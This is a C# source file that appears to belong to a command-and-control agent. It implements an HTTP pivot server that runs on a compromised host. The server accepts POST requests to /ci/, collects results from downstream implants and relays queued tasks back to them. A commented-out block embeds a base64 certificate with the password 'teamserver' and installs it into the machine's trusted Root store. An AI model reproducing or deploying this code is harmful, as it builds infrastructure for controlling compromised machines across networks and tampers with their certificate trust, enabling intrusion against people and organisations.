using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Agent.Communication;
using Agent.Helpers;
using Agent.Models;

namespace Agent.Service.Pivoting
{
    public class PivotHttpServer : PivotServer
    {
        public PivotHttpServer(ConnexionUrl conn) : base(conn)
        {
        }


        public override async Task Start()
        {
            try
            {
                this.Status = RunningService.RunningStatus.Running;
                var listener = new HttpListener();

                string url = "http://" + Connexion.Address + ":" +Connexion.Port + "/";
                /*if (this._isSecure)
                {
                    url = "https://" + _bindAddress + ":" + this._bindPort + "/";
                    byte[] certBytes = Convert.FromBase64String("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");
                    string certPassword = "teamserver";
                    X509Certificate2 certificate = new X509Certificate2(certBytes, certPassword);
                    X509Store store = new X509Store(StoreName.Root, StoreLocation.LocalMachine);
                    store.Open(OpenFlags.ReadWrite);
                    if (!store.Certificates.Contains(certificate))
                    {
                        store.Add(certificate);
                    }
                    store.Close();
                    //listener.AuthenticationSchemeSelectorDelegate = (context) =>
                    //{
                    //    return AuthenticationSchemes.;
                    //};
                }*/

                listener.Prefixes.Add(url);
                listener.Start();

                while (!_tokenSource.IsCancellationRequested)
                {
                    // this blocks until a connection is received or token is cancelled
                    var client = await listener.AcceptHttpClientAsync(_tokenSource);

                    // do something with the connected client
                    var thread = new Thread(async () => await HandleClient(client));
                    thread.Start();
                }
                // handle client in new thread

                listener.Stop();
            }
            finally
            {
                this.Status = RunningService.RunningStatus.Stoped;
            }
        }

        private async Task HandleClient(HttpListenerContext client)
        {
            if (client == null)
                return;

            try
            {
                HttpListenerRequest request = client.Request;
                HttpListenerResponse response = client.Response;

                if (!client.Request.Url.LocalPath.ToLower().StartsWith("/ci/") || client.Request.HttpMethod != "POST")
                {
                    await response.ReturnNotFound();
                    return;
                }

                string content = string.Empty;
                using (StreamReader reader = new StreamReader(request.InputStream, request.ContentEncoding))
                {
                    content = await reader.ReadToEndAsync();
                    Debug.WriteLine("HTTP Pivot : POST Request Content: " + content);
                }

                var responses = Encoding.UTF8.GetBytes(content).Deserialize<List<MessageResult>>();
                _messageService.EnqueueResults(responses);

                var relays = this.ExtractRelays(responses);

                var tasks = this._messageService.GetMessageTasksToRelay(relays);

                response.StatusCode = 200;
                response.ContentType = "text/plain";
                byte[] buffer = tasks.Serialize();
                response.ContentLength64 = buffer.Length;
                System.IO.Stream output = response.OutputStream;
                await output.WriteAsync(buffer, 0, buffer.Length);
                output.Close();

            }
            catch (Exception ex)
            {
#if DEBUG
                Debug.WriteLine(ex);
#endif
            }
            finally
            {
                Debug.WriteLine($"HTTP Pivot  : disconnected");
            }
        }
    }
}
